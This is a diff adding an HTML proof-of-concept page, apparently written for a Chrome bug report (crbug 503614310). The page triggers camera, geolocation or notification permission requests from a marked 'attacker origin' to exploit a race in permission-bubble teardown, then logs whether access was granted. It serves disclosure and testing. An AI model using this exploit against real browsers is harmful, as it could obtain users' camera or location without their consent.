@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Race Payload — crbug 503614310</title>
+<style>
+body{font-family:system-ui,sans-serif;max-width:600px;margin:20px auto;padding:16px;background:#1a1a2e;color:#e0e0e0}
+h1{font-size:1.2em;color:#ff6b6b}
+pre{background:#0d0d1a;padding:12px;font-size:12px;min-height:120px;white-space:pre-wrap;color:#00ff88}
+.win{color:#00ff88;font-weight:bold}
+.lose{color:#ff6b6b}
+.timing{color:#ffd93d}
+</style>
+</head>
+<body>
+<h1>Race Payload — Attacker Origin (127.0.0.1:9080)</h1>
+<p>This page loaded in the popup after navigation. It immediately triggers a permission request.</p>
+<p>If the original origin's BLOCK state causes a synchronous callback, the permission subsystem state will be overwritten before the bubble teardown completes.</p>
+<pre id="log"></pre>
+
+<script>
+const params = new URLSearchParams(location.search);
+const raceType = params.get('type') || 'camera';
+const payloadOrigin = '127.0.0.1:9080';
+
+function log(msg) {
+  const el = document.getElementById('log');
+  el.textContent += '[' + performance.now().toFixed(0) + 'ms] ' + msg + '\n';
+}
+
+log('=== RACE PAYLOAD LOADED ===');
+log('Origin: ' + payloadOrigin + ' (ATTACKER)');
+log('Race type: ' + raceType);
+log('Calling permission API immediately on page load...');
+
+const loadStart = performance.now();
+
+function reportToOpener(result) {
+  try {
+    if (opener && !opener.closed && opener.reportRace) {
+      opener.reportRace(raceType + ':' + result);
+    }
+  } catch(e) {}
+}
+
+if (raceType === 'camera' || raceType === 'media') {
+  log('Calling: navigator.mediaDevices.getUserMedia({video:true})');
+  
+  navigator.mediaDevices.getUserMedia({video: true})
+    .then(stream => {
+      const elapsed = (performance.now() - loadStart).toFixed(0);
+      log('✓ GRANTED in ' + elapsed + 'ms — CAMERA ACCESS GRANTED TO ATTACKER ORIGIN');
+      log('⚠️  THIS IS THE SECURITY IMPACT: attacker can now record video');
+      stream.getTracks().forEach(t => t.stop());
+      reportToOpener('GRANTED');
+    })
+    .catch(err => {
+      const elapsed = (performance.now() - loadStart).toFixed(0);
+      log('✗ ' + err.name + ' in ' + elapsed + 'ms — ' + err.message);
+      
+      if (err.name === 'NotAllowedError') {
+        log('Camera still BLOCKED. The synchronous response may have set origin state,');
+        log('but if the fix is present, CommitChanges will use the cached origin.');
+        log('Verdict: Race payload executed, but fix may have prevented exploitation.');
+      }
+      reportToOpener(err.name);
+    });
+
+} else if (raceType === 'geolocation') {
+  log('Calling: navigator.geolocation.getCurrentPosition()');
+  
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const elapsed = (performance.now() - loadStart).toFixed(0);
+      log('✓ GRANTED in ' + elapsed + 'ms — GEOLOCATION ACCESS GRANTED TO ATTACKER');
+      log('⚠️  SECURITY IMPACT: attacker can track user location');
+      log('  lat=' + pos.coords.latitude.toFixed(4) + ' lon=' + pos.coords.longitude.toFixed(4));
+      reportToOpener('GRANTED');
+    },
+    err => {
+      const elapsed = (performance.now() - loadStart).toFixed(0);
+      log('✗ Error ' + err.code + ' in ' + elapsed + 'ms — ' + err.message);
+      reportToOpener('ERROR_' + err.code);
+    },
+    { timeout: 5000 }
+  );
+
+} else if (raceType === 'notifications') {
+  log('Calling: Notification.requestPermission()');
+  
+  Notification.requestPermission().then(perm => {
+    const elapsed = (performance.now() - loadStart).toFixed(0);
+    log('Notification permission: ' + perm + ' in ' + elapsed + 'ms');
+    if (perm === 'granted') {
+      log('⚠️  SECURITY IMPACT: attacker can send push notifications');
+    }
+    reportToOpener(perm);
+  });
+}
+
+// Measure how long this page took to start executing scripts
+log('');
+log('Page load-to-script-execution: ' + (performance.now() - performance.timing.navigationStart).toFixed(0) + 'ms');
+log('This number is part of the race window calculation.');
+log('Browser: ' + navigator.userAgent.match(/Chrome\/(\d+)/)?.[0] || 'unknown');
+</script>
+</body>
+</html>
